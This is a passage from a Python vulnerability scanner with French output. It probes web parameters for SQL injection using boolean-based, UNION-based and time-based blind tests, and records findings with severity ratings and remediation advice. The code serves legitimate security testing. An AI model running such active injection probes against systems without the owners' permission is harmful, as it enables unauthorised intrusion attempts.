                        except requests.exceptions.RequestException:
                            confirmed, confirm_evidence = False, ""
                        if confirmed:
                            evidence = f"{evidence} Confirmation: {confirm_evidence}"
                            method_name = "Boolean-based (confirmé deux fois)"
                            break
                        detected = False

            # ── 2c: UNION-based SQLi ──────────────────────────────────────
            if not detected:
                detected, evidence = _test_union_sqli(
                    session,
                    candidate,
                    original,
                    timeout,
                    max_columns=max_union_columns,
                )
                if detected:
                    method_name = "UNION-based"

            # ── 2d: Time-based blind SQLi ─────────────────────────────────
            if not detected and time_probes_used < max_time_probes:
                time_probes_used += 1
                detected, evidence = _test_time_sqli(
                    session, candidate, original, timeout, baseline_time
                )
                if detected:
                    method_name = "Time-based blind"

            # ── Record finding ────────────────────────────────────────────
            if detected:
                path = urlparse(candidate["url"]).path or "/"
                # Unconfirmed error-based (generic 500 without SQL error strings)
                # is downgraded to Moyen — it could be WAF/validation, not real SQLi.
                if "non confirmé" in method_name:
                    severity = "Moyen"
                    finding_type = "Risque d'injection SQL (non confirmé)"
                else:
                    severity = "Critique"
                    finding_type = "Injection SQL (SQLi)"
                description = (
                    f"Le paramètre '{candidate['param']}' semble influencer une requête SQL sur "
                    f"{candidate['method'].upper()} {path}. "
                    f"Méthode de détection: {method_name}. "
                    f"Indice: {evidence}"
                )
                key = (
                    "sqli",
                    candidate["method"],
                    candidate["url"],
                    candidate["param"],
                )
                if _insert_once(
                    cursor,
                    scan_id,
                    inserted,
                    key,
                    finding_type,
                    severity,
                    description,
                    "Utiliser des requêtes préparées/paramétrées, éviter toute concaténation SQL avec l'entrée utilisateur, valider les types attendus et limiter les privilèges du compte base de données.",
                ):
                    findings += 1
                    conn.commit()
                    print(
                        f"  [+] SQLi détectée ({method_name}): {candidate['method'].upper()} {path} param={candidate['param']}"
                    )

        if not _ctx:
            finish_scan(conn, cursor, scan_id, "Terminé")
        print(
            f"[*] Exploitation terminée. {findings} faille(s) active(s) sauvegardée(s)."
        )

    except Exception as exc:
        print(f"  [X] Erreur exploitation : {exc}")
        if not _ctx and scan_id is not None:
            finish_scan(conn, cursor, scan_id, "Erreur")
    finally:
        if not _ctx:
            conn.close()


if __name__ == "__main__":
    tester_injections("http://localhost")
